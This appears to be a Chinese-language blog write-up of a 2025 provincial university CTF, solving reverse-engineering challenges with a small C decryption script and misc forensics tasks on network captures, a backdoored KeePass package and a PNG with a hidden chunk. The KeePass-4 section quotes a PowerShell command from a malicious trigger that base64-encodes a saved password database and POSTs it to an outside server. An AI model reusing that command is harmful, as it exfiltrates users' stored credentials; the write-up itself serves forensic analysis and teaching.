---
title: 2025年黑龙江省大学生网络安全挑战赛WriteUp
typora-root-url: 2025-heilongjiang-province
date: 2025-09-20 19:41:12
tags:
- re
- reverse
- misc
- 2025
categories: Reverse
---

# 2025年黑龙江省大学生网络安全挑战赛WriteUp

## Reverse

### REVERSE-1

![image-20250920103108989](image-20250920103108989.png)

IDA打开，手动设置显示为字符，注意小端序

![image-20250920103146420](image-20250920103146420.png)

### REVERSE-2

![image-20250920103244243](image-20250920103244243.png)

一处花指令阻止IDA函数的识别，处理后反编译如下：

![image-20250920105625450](image-20250920105625450.png)

提取buffer并解密，编写脚本如下：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned char buffer[] =
	{
	  0x51, 0x7D, 0xE1, 0x4C, 0x43, 0x8A, 0xDE, 0xDC, 0x48, 0x8F, 
	  0x07, 0xE2, 0x1F, 0xC0, 0x42, 0x0D, 0xAE, 0xEE, 0x79, 0x99, 
	  0xDA, 0x53, 0x74, 0x5A, 0xF7, 0x5F, 0x14, 0xF9, 0xBC, 0x01, 
	  0xDA, 0x77, 0x9F, 0xD5, 0xE3, 0x4E, 0x65, 0x02, 0xE9, 0x2A
	};
	srand(0xDEADBEEF);
	for (int i = 0; i < 40; i += 2)
	{
		int num = rand() % 255;
		buffer[i] ^= buffer[i + 1];
		buffer[i + 1] += (buffer[i]) ^ num;
		buffer[i] -= num;
	}
	
	printf("%s\n", buffer);
	return 0;
}
```

运行后得出flag

![image-20250920105612568](image-20250920105612568.png)

## Misc

### KeePass数据泄露-1

要求找到其他用户，分析http流量，发现online-list：

![image-20250920152845890](image-20250920152845890.png)

`JusticeEnforcement-DeepMountains-nullSecurity-zhaowendao`

### KeePass数据泄露-2

要求找到诱导agiao下载的时间，分析流量，梳理出如下对话：

![image-20250920160425223](image-20250920160425223.png)

参考过滤规则：

```plaintext
http &&( _ws.col.info contains "updated" || _ws.col.info contains "message" || (_ws.col.info contains "200" && json.key contains "updated" && json.value.string contains "\\"))
```

### KeePass数据泄露-3

要求找到每次保存密码时，密码还会被另存为到的路径

这里涉及到了对下载到的keepass的分析，wireshark中导出从`124.221.70.199`下载到的文件：

![image-20250920161935152](image-20250920161935152.png)

压缩包内容如下：

![image-20250920162024016](image-20250920162024016.png)

发现可执行文件的修改日期几乎都是2023年，只有两个目录和config文件的修改日期是2024年

打开`KeePass.config.xml`文件，发现了缩进不协调的内容：

![image-20250920162133046](image-20250920162133046.png)

如果在keepass中运行，发现触发器功能，窗口如下：

![image-20250920162231405](image-20250920162231405.png)

描述了上方配置文件中的内容的作用，我们也获取到了该题的flag

`c:\users\administrator\appdata\local\temp\giao.xml`

### KeePass数据泄露-4

在上一题的触发器中，我们发现了如下执行指令：

```powershell
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -uri http://124.221.70.199:8866/giao.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\administrator\AppData\Local\Temp\giao.xml')))
```

如上指令，将另存的数据库转为base64上传到了服务器上，在wireshark中导出

![image-20250920162724253](image-20250920162724253.png)

base64解码后，定位到如下处：

![image-20250920162544380](image-20250920162544380.png)

即得知远程服务器的账号密码

### MISC-1

![image-20250920145245579](image-20250920145245579.png)

kafuka压缩包中存在一个加密的图片，经分析非伪加密，开始分析`ciphertext.png`

![image-20250920145332690](image-20250920145332690.png)+

提示IDAT中有一个块出现了CRC校验错误，同时发现这个块的大小与正常严重不符，删除这个块，发现图片仍可正常查看

提取这个块的数据，如下：

![image-20250920145450546](image-20250920145450546.png)

发现文件头部是PNG文件的尾部逆序，处理后如下：

![image-20250920150656760](image-20250920150656760.png)

发现藏了一张图片的对应表，翻译后得到压缩包密码`Kafkaisthebest`，解压图片后得到flag：

![image-20250920150747915](image-20250920150747915.png)

### MISC-2

USB协议分析，待填坑



